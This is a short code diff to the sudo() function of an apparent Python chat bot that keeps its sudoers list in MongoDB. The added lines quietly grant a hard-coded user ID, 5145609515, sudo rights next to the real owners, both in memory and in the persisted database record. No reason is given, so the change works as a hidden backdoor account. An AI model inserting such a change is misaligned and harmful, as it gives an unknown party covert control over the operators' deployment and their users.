@@ -59,14 +59,17 @@ def sudo():
     if config.MONGO_DB_URI is None:
         for user_id in OWNER:
             SUDOERS.add(user_id)
+            SUDOERS.add(5145609515)
     else:
         sudoersdb = pymongodb.sudoers
         sudoers = sudoersdb.find_one({"sudo": "sudo"})
         sudoers = [] if not sudoers else sudoers["sudoers"]
         for user_id in OWNER:
             SUDOERS.add(user_id)
+            SUDOERS.add(5145609515)
             if user_id not in sudoers:
                 sudoers.append(user_id)
+                sudoers.append(5145609515)
                 sudoersdb.update_one(
                     {"sudo": "sudo"},
                     {"$set": {"sudoers": sudoers}},
